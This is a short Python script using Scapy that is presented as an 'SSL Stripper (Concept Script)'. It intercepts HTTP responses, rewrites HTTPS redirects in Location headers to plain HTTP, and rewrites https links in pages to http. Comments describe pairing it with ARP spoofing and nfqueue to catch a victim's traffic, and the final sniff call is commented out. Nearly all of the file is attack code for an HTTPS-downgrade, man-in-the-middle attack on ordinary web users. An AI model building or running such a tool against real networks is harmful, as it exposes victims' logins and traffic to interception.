from scapy.all import *
import re

def process_packet(packet):
    # Check if the packet has a Raw payload (HTTP data) and is TCP
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        
        # HACKER LOGIC 1: Intercepting the server's redirect to HTTPS
        if "HTTP/1.1 301" in payload or "HTTP/1.1 302" in payload:
            if "Location: https://" in payload:
                print("\n[!] Caught Server trying to upgrade to HTTPS!")
                # Force downgrade: Change 'https' to 'http'
                modified_payload = payload.replace("Location: https://", "Location: http://")
                packet[Raw].load = modified_payload.encode('utf-8')
                
                # Delete checksums so Scapy recalculates them automatically
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum
                print("[+] Stripped SSL! Victim stays on HTTP.")
                return packet

        # HACKER LOGIC 2: Stripping secure links from web pages
        if "href=\"https://" in payload:
            modified_payload = payload.replace("href=\"https://", "href=\"http://")
            packet[Raw].load = modified_payload.encode('utf-8')
            del packet[IP].len
            del packet[IP].chksum
            del packet[TCP].chksum
            return packet

    return packet

print("====================================")
print("😈 SSL Stripper (Concept Script) 😈")
print("====================================")
print("[*] Waiting for HTTP traffic to intercept...")

# In real life, this runs alongside ARP Spoofing to catch the traffic
# nfqueue is used in Linux to hold packets, modify them, and release them.
# sniff(filter="tcp port 80", prn=process_packet)
